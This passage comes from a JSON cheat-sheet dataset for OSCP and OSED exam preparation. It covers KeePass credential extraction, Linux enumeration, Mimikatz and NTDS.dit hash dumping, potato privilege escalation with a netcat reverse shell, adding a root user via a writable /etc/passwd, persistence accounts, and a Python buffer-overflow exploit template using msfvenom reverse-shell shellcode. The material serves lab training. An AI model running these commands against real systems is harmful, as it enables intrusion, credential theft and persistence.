        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Community-driven hash database with billions of entries."
          }
        ]
      },
      {
        "title": "hashes.com",
        "codes": [
          {
            "lang": "text",
            "code": "https://hashes.com/en/decrypt/hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Free hash lookup with API access."
          },
          {
            "type": "note",
            "content": "Never submit sensitive hashes to online services in real engagements.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Before spending time cracking, check if the hash is already known.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "KeePass Password Manager",
    "title": "Opening KeePass Database with kpcli",
    "tags": [],
    "steps": [
      {
        "title": "Installation",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo apt install kpcli"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Opening Database",
        "codes": [
          {
            "lang": "bash",
            "code": "kpcli --kdb=Database.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "You'll be prompted for the master password (the one you cracked).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Example Session",
        "codes": [
          {
            "lang": "bash",
            "code": "kpcli --kdb=Database.kdbx\n# Enter password: welcome\n\nkpcli:/> ls\n=== Groups ===\nInternet/\nEmail/\nDatabases/\nWindows/\n\nkpcli:/> cd Databases\n\nkpcli:/Databases> ls\n=== Entries ===\n0. MySQL Production\n1. PostgreSQL Dev\n2. MSSQL Server\n\nkpcli:/Databases> show 0\n\nTitle: MySQL Production\nUserName: root\nPassword: SuperSecretPass123!\nURL: mysql://10.10.10.5:3306\nNotes: Production database credentials"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common kpcli Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "# List groups and entries\nls\n\n# Change directory\ncd <GroupName>\n\n# Show entry details\nshow <EntryNumber>\n\n# Show entry with hidden password visible\nshow -f <EntryNumber>\n\n# Search for entries\nfind <SearchTerm>\n\n# Export database\nexport <filename>\n\n# Help\nhelp\n\n# Exit\nquit"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "KeePass Password Manager",
    "title": "Opening with KeePassXC (GUI)",
    "tags": [],
    "steps": [
      {
        "title": "Installation",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo apt install keepassxc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Opening Database",
        "codes": [
          {
            "lang": "bash",
            "code": "keepassxc Database.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Enter the cracked master password when prompted.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Exporting Credentials",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. Open database with master password\n2. File \u2192 Export \u2192 CSV\n3. Save exported credentials"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Enumeration",
    "title": "Operating System Information",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Check Disk Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "df -h"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check Kernel and CPU Information",
        "codes": [
          {
            "lang": "bash",
            "code": "uname -a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Display OS Information",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/issue"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Display OS Version",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/*release*"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Display Kernel Information",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /proc/version"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Locate Shell Executables",
        "codes": [
          {
            "lang": "bash",
            "code": "# Find location of specific shells (bash, csh, ksh, tcsh, etc.)\nwhich <ShellName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Display Connected Drives",
        "codes": [
          {
            "lang": "bash",
            "code": "fdisk -l"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Linux Enumeration",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Gather basic system information for situational awareness."
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "OSCP Exam Considerations",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In the OSCP exam:\n- Default credentials are rarely the answer\n- But always worth a quick check\n- Focus on enumeration and exploitation\n- Don't waste time on extensive brute-forcing",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "Quick default check workflow:\n1. Try username:username (30 seconds)\n2. Try admin:admin (30 seconds)\n3. Move on to enumeration if both fail",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "OSCP Exam Considerations",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Zerologon is UNLIKELY to appear on OSCP exam due to:\n- Destructive nature (breaks domain until restored)\n- Requires specific vulnerable Windows versions\n- OSCP focuses on non-destructive techniques",
        "variant": "warning"
      },
      {
        "type": "text",
        "content": "**If you encounter it:**\n1. **Test first** - Use zerologon_tester.py\n2. **Save original hash** - BEFORE exploitation\n3. **Document everything** - You'll need to restore\n4. **Have restore script ready** - Don't break the lab\n5. **Consider alternatives** - Look for other privilege escalation paths first"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "OSCP Exam Strategy",
    "tags": [],
    "steps": [
      {
        "title": "Exam-Specific Workflow",
        "codes": [
          {
            "lang": "plaintext",
            "code": "1. Try admin:admin (30 sec)\n2. Try username:username (30 sec)\n3. Enumerate more (10 min)\n4. Try password spray with 5-10 common passwords (5 min)\n5. If still stuck, enumerate more - don't brute force yet\n6. Only use rockyou.txt if you have strong evidence"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "When to Brute Force in Exam",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2713 Found a hash that needs cracking\n\u2713 Found encrypted file (zip, keepass, etc.)\n\u2713 Specific hint that brute-forcing is needed\n\u2713 All other enumeration exhausted"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "When NOT to Brute Force",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u274c As first attempt\n\u274c Without valid usernames\n\u274c Without trying defaults first\n\u274c When you haven't fully enumerated"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- Time is limited (24 hours for 3 machines)\n- Brute-forcing is rarely the answer\n- Focus on enumeration over brute-forcing\n- If you're brute-forcing, you're probably missing something",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "OSCP Exam Strategy",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [],
    "resources": [
      {
        "text": "OSCP Exam Guide",
        "url": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide"
      },
      {
        "text": "TJNull's List",
        "url": "https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Proven strategies for time management and point accumulation during the OSCP exam."
      }
    ]
  },
  {
    "category": "KeePass Password Manager",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP labs/exam:\n- KDBX files are often intentionally placed\n- Master password is usually in rockyou.txt\n- Don't spend too long on complex cracking\n- Check for password hints in file names or notes",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "Quick workflow:\n1. Find KDBX file (2 minutes)\n2. Extract hash (30 seconds)\n3. Crack with rockyou.txt (5-10 minutes)\n4. Open with kpcli (1 minute)\n5. Extract all credentials (2 minutes)\n6. Test credentials everywhere (ongoing)",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "File Transfer Techniques",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- impacket-smbserver is your best friend\n- Always have HTTP server ready\n- Test file transfers before exam\n- Know multiple methods in case one fails",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "Quick exam setup:\n1. Terminal 1: `impacket-smbserver share . -smb2support`\n2. Terminal 2: `python3 -m http.server 80`\n3. Terminal 3: `nc -lvnp 4444` (for receiving files)\n4. Keep these running throughout exam",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [
      {
        "title": "Quick Exam Workflow",
        "codes": [
          {
            "lang": "bash",
            "code": "# 1. Get reverse shell\nnc -lvnp 4444\n\n# 2. Immediately stabilize\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\n# Enter, Enter\nreset\nexport TERM=xterm\n\n# 3. Continue enumeration"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- Stabilize shells immediately after getting them\n- Python method works 99% of the time\n- Practice the muscle memory: python \u2192 Ctrl+Z \u2192 stty \u2192 fg \u2192 reset\n- Don't waste time if stabilization fails, just work with basic shell",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- .git directories are sometimes intentionally exposed\n- Look for credentials in commit history\n- Check for hardcoded passwords in old commits\n- Examine configuration files carefully",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "Quick workflow:\n1. Check for `.git` directory (1 minute)\n2. Download with git-dumper (2 minutes)\n3. `git log` to view commits (1 minute)\n4. `git show` on suspicious commits (2 minutes)\n5. Search for \"password\", \"secret\", \"api\" (2 minutes)\n6. Test found credentials (ongoing)",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Security Headers Scanning",
    "title": "OSCP Exam Tips",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Security headers are useful for reconnaissance but rarely exploitable alone.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 2-3 minutes for header analysis"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Check for missing CSP** - Indicates XSS may be possible\n2. **Check for missing X-Frame-Options** - Test for clickjacking\n3. **Look for version disclosure** - Server, X-Powered-By headers\n4. **Note weak configurations** - Document for report"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Spending too much time on header analysis\n- Assuming missing headers = automatic vulnerability\n- Not testing actual exploitability (XSS, clickjacking)"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Use `curl -I` for quick header checks\n- Focus on CSP and X-Frame-Options for actual vulnerabilities\n- Document version information for later exploit searching\n- Missing headers are report findings, not necessarily exploitable\n- Combine with other recon (Nikto, Nmap, Burp)"
      }
    ]
  },
  {
    "category": "User Management Commands",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [
      {
        "title": "Quick Exam Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "# Windows - Quick admin user\nnet user oscp P@ssw0rd123! /add && net localgroup Administrators oscp /add && net localgroup \"Remote Desktop Users\" oscp /add"
          },
          {
            "lang": "bash",
            "code": "# Linux - Quick sudo user\nsudo useradd -m -s /bin/bash oscp && sudo passwd oscp && sudo usermod -aG sudo oscp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- Create users for persistence after getting admin/root\n- Document credentials you create\n- Use strong passwords (Password123!)\n- Add to RDP/sudo for easy re-access\n- Test login before moving on",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "OSCP Exam Tips",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Mimikatz is essential for Windows privilege escalation and lateral movement.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 2-5 minutes for credential dumping"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **sekurlsa::logonpasswords** - First command to run after getting admin\n2. **lsadump::sam** - Dump local hashes for offline cracking\n3. **sekurlsa::tickets /export** - Export tickets for pass-the-ticket\n4. **Save all output to files** - Use `> output.txt` for later analysis"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Forgetting `privilege::debug` before other commands\n- Not running as administrator\n- Using wrong architecture (x86 vs x64)\n- Not saving output to files"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Use one-liners to avoid interactive sessions\n- Always save output to files for later analysis\n- If Mimikatz is blocked, use pypykatz or dump LSASS offline\n- Combine with NetExec for automated credential spraying\n- Use DCSync instead of dumping NTDS.dit (faster, stealthier)"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "OSCP Exam Tips",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Shadow copies are critical for extracting NTDS.dit on domain controllers.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 10-15 minutes for complete NTDS.dit extraction and hash dumping"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Use impacket-secretsdump with -use-vss** - Fully automated\n2. **Check for existing shadow copies first** - No need to create new ones\n3. **Extract SYSTEM hive** - Required for decrypting NTDS.dit\n4. **Use NetExec for speed** - `nxc smb DC --ntds vss`"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Forgetting to copy SYSTEM registry hive\n- Using wrong shadow copy path (check with `vssadmin list shadows`)\n- Not transferring files to Kali before extraction\n- Trying to open NTDS.dit directly (must use secretsdump)"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Always copy both NTDS.dit AND SYSTEM hive\n- Use `-just-dc-user Administrator` to extract specific users faster\n- Save all hashes to file for offline cracking\n- Delete shadow copies after extraction to clean up\n- If you have DA, use DRSUAPI method instead (stealthier)"
      }
    ]
  },
  {
    "category": "Tunneling with Chisel",
    "title": "OSCP Exam Tips",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Chisel is essential for dual-homed machines in OSCP.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 5 minutes to set up tunnel"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Dual-homed machine found** - Use Chisel to access second network\n2. **Internal web app discovered** - Tunnel port to Kali for enumeration\n3. **Multiple services on internal network** - SOCKS proxy for full access"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Forgetting `--reverse` flag on server\n- Using wrong IP (victim's IP vs internal target IP)\n- Not configuring ProxyChains for SOCKS proxy\n- Blocking port with firewall"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Always use reverse tunneling (victim connects to you)\n- Test tunnel with `curl` before running scans\n- Use SOCKS proxy for full network enumeration\n- Keep chisel.exe in your toolkit folder\n- Document all tunnels in your notes"
      }
    ]
  },
  {
    "category": "Invoke-RunasCs",
    "title": "OSCP Exam Tips",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Invoke-RunasCs is the Windows equivalent of `su` - essential for privilege escalation.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 2-3 minutes to execute commands as another user"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Found credentials in config file** - Use Invoke-RunasCs to escalate\n2. **Have user password but no RDP/WinRM** - Get shell with Invoke-RunasCs\n3. **Need to execute as SYSTEM** - Combine with other techniques"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Forgetting to wrap command in `cmd.exe /c` or `powershell.exe -c`\n- Not escaping special characters in password\n- Using wrong logon type"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Always test with `whoami` first\n- Use for lateral movement when you have credentials\n- Combine with reverse shell for interactive access\n- Works when PSExec and WinRM are blocked"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "OSCP Exam Tips",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- SeImpersonatePrivilege is a common privilege escalation path\n- GodPotato and PrintSpoofer work on most exam machines\n- Always test with `whoami` first before reverse shell\n- Keep multiple potato tools ready",
        "variant": "warning"
      },
      {
        "type": "note",
        "content": "Quick exam workflow:\n1. `whoami /priv` - Check for SeImpersonate (30 seconds)\n2. Upload GodPotato (1 minute)\n3. Test: `GodPotato.exe -cmd \"whoami\"` (30 seconds)\n4. Reverse shell: `GodPotato.exe -cmd \"nc.exe <IP> <PORT> -e cmd.exe\"` (1 minute)\n5. Total time: ~3 minutes to SYSTEM",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "OSCP Exam Tips",
    "tags": [],
    "steps": [
      {
        "title": "Quick Exam Workflow",
        "codes": [
          {
            "lang": "bash",
            "code": "# 1. Check if writable (30 seconds)\nls -l /etc/passwd\n\n# 2. Generate hash (30 seconds)\nopenssl passwd password\n\n# 3. Add user (30 seconds)\necho 'oscp:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n# 4. Switch user (30 seconds)\nsu oscp\n# Password: password\n\n# 5. Get flag (30 seconds)\ncat /root/proof.txt\n\n# Total: ~3 minutes to root"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "In OSCP exam:\n- Check /etc/passwd permissions during enumeration\n- If writable, this is instant root\n- Use simple password (password, Password123)\n- Document the misconfiguration\n- Take screenshot of permissions",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "OSCP Exam Tips",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "LDAP enumeration is critical for AD environments.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 10-15 minutes for comprehensive LDAP enumeration"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Test anonymous bind first** - Some domains allow it\n2. **Use windapsearch for speed** - Faster than manual ldapsearch\n3. **Check user descriptions** - Often contain passwords\n4. **Find Kerberoastable users** - Easy privilege escalation path\n5. **Enumerate privileged groups** - Identify high-value targets"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Not testing anonymous LDAP access\n- Using wrong authentication format\n- Forgetting to enumerate SPNs for Kerberoasting\n- Not checking user descriptions for passwords"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Save all LDAP output to files for later analysis\n- Use `ldapdomaindump` for visual HTML reports\n- Cross-reference LDAP data with BloodHound results\n- Look for users with `adminCount=1` - they're privileged"
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "OSCP Exam Tips",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "NetExec is essential for Active Directory enumeration.",
        "variant": "important"
      },
      {
        "type": "text",
        "content": "**Time Estimate:** 5-10 minutes for comprehensive network enumeration"
      },
      {
        "type": "text",
        "content": "**Quick Wins:**\n1. **Test credentials across all hosts** - Find where you have admin access\n2. **Enumerate shares** - Look for sensitive files\n3. **Check password policy** - Plan password spraying safely\n4. **Dump SAM/LSA** - Get local credentials for lateral movement\n5. **Spider shares** - Find passwords in files"
      },
      {
        "type": "text",
        "content": "**Common Mistakes:**\n- Not using `--continue-on-success` when testing multiple credentials\n- Causing account lockouts with aggressive password spraying\n- Forgetting to check for null sessions (`-u '' -p ''`)\n- Not testing local authentication (`--local-auth`)"
      },
      {
        "type": "text",
        "content": "**Pro Tips:**\n- Always check `--pass-pol` before password spraying\n- Use `--gen-relay-list` to find relay targets\n- Save all output to files for later analysis\n- Test both SMB and WinRM for command execution\n- Use `-M spider_plus` to find sensitive files quickly"
      }
    ]
  },
  {
    "category": "OSED Challenge Labs",
    "title": "OSED Challenge Lab Methodology",
    "tags": [
      "Binary_Exploitation",
      "Exploitation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Lab Approach Overview [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "General methodology for exploit development labs:\n1. **Reconnaissance** - Understand target application\n2. **Vulnerability Discovery** - Find the bug\n3. **Exploitation Planning** - Design exploit strategy\n4. **Exploit Development** - Build working exploit\n5. **Testing & Refinement** - Debug and polish",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Phase 1: Reconnaissance",
        "codes": [
          {
            "lang": "text",
            "code": "; Enumerate target application\n- What does it do? (network service, file parser, etc.)\n- What protocol/format does it use?\n- What version/build?\n- What protections are enabled?\n\n; Check protections\n!mona modules\nGet-ProcessMitigation -Name <Process>\n\n; Note architecture\n- 32-bit or 64-bit?\n- Which OS version?"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Gather information about target."
          }
        ]
      },
      {
        "title": "Phase 2: Vulnerability Discovery",
        "codes": [
          {
            "lang": "text",
            "code": "; Identify attack surface\n- Network listeners (ports, protocols)\n- File parsing (formats accepted)\n- User input handling\n\n; Fuzz inputs\n- Network protocols: size fields, opcodes\n- File formats: headers, length fields\n- Look for crashes\n\n; Analyze crashes\n!analyze -v\nr\n!exchain\nkb"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find the exploitable bug."
          }
        ]
      },
      {
        "title": "Phase 3: Exploitation Planning",
        "codes": [
          {
            "lang": "text",
            "code": "; Determine exploit type\n- Stack overflow \u2192 Return address or SEH?\n- Heap overflow \u2192 Corruption primitive?\n- Format string \u2192 Read/Write primitive?\n\n; Check for bad characters\n!mona bytearray -cpb \"\\x00\"\n!mona compare -a <ESP> -f bytearray.bin\n\n; Identify available space\n- How much controlled buffer?\n- Where does shellcode fit?\n\n; Plan DEP/ASLR bypass\n- Non-ASLR module available?\n- Information leak possible?\n- ROP gadgets available?"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Design exploit strategy based on conditions."
          }
        ]
      },
      {
        "title": "Phase 4: Exploit Development",
        "codes": [
          {
            "lang": "text",
            "code": "; Step 1: Control EIP/SEH\n- Find exact offset\n- Verify control\n\n; Step 2: Find return address/gadgets\n!mona jmp -r esp\n!mona rop -m <Module>\n\n; Step 3: Handle bad characters\n- Encode shellcode\n- Find clean gadgets\n\n; Step 4: Build payload\n- ROP chain (if DEP)\n- Egghunter (if space limited)\n- Direct shellcode (if no DEP)\n\n; Step 5: Add shellcode\nmsfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b \"<BadChars>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Build the exploit step by step."
          }
        ]
      },
      {
        "title": "Phase 5: Testing & Debugging",
        "codes": [
          {
            "lang": "text",
            "code": "; Set breakpoints at key locations\nbp <ReturnAddress>\nbp <ShellcodeStart>\n\n; Verify each stage\n- EIP control\n- Gadget execution\n- Shellcode decoding\n- Shell connection\n\n; Common issues\n- Bad characters in addresses\n- Stack alignment\n- Shellcode corruption\n- Timing issues"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify and debug exploit."
          }
        ]
      },
      {
        "title": "Quick Reference Commands",
        "codes": [
          {
            "lang": "text",
            "code": "; WinDbg basics\ng                           ; Run\nbp <addr>                   ; Breakpoint\nbl                          ; List breakpoints\nbc *                        ; Clear all breakpoints\np                           ; Step over\nt                           ; Step into\nr                           ; Registers\ndd esp L10                  ; Dump stack\ndb <addr> L50               ; Dump bytes\nu <addr> L10                ; Disassemble\n\n; Mona essentials\n!mona config -set workingfolder C:\\mona\\%p\n!mona pc 5000               ; Create pattern\n!mona po <value>            ; Find offset\n!mona modules               ; List modules\n!mona jmp -r esp            ; Find JMP ESP\n!mona rop -m <Module>       ; Generate ROP\n!mona bytearray -cpb \"\\x00\" ; Bad char array\n!mona compare -a esp -f bytearray.bin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Essential **WinDbg** and **mona.py** commands for lab work."
          }
        ]
      },
      {
        "title": "Exploit Template",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/env python3\n\"\"\"\nTarget: <Application Name>\nVulnerability: <Type>\nAuthor: <Name>\n\"\"\"\n\nimport socket\nimport struct\nimport sys\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Configuration\nTARGET_IP = \"<TargetIP>\"\nTARGET_PORT = <Port>\nTIMEOUT = 5\n\n# Offsets and addresses\nOFFSET = 0          # Offset to EIP/SEH\nEIP = p32(0x41414141)  # Return address\n\n# Shellcode\n# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b \"\\x00\"\nshellcode = b\"\"\nshellcode += b\"\\x90\" * 16  # NOP sled\n\ndef build_exploit():\n    \"\"\"Construct exploit payload\"\"\"\n    buffer = b\"A\" * OFFSET\n    buffer += EIP\n    buffer += b\"\\x90\" * 16\n    buffer += shellcode\n    return buffer\n\ndef send_exploit(payload):\n    \"\"\"Send payload to target\"\"\"\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(TIMEOUT)\n        s.connect((TARGET_IP, TARGET_PORT))\n        s.send(payload)\n        s.close()\n        print(\"[+] Payload sent\")\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n        sys.exit(1)\n\ndef main():\n    print(f\"[*] Targeting {TARGET_IP}:{TARGET_PORT}\")\n    payload = build_exploit()\n    print(f\"[*] Payload size: {len(payload)} bytes\")\n    send_exploit(payload)\n\nif __name__ == \"__main__\":\n    main()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Starting point for exploit scripts."
          }
        ]
      },
      {
        "title": "ROP Exploit Template",
        "codes": [
          {
            "lang": "python",
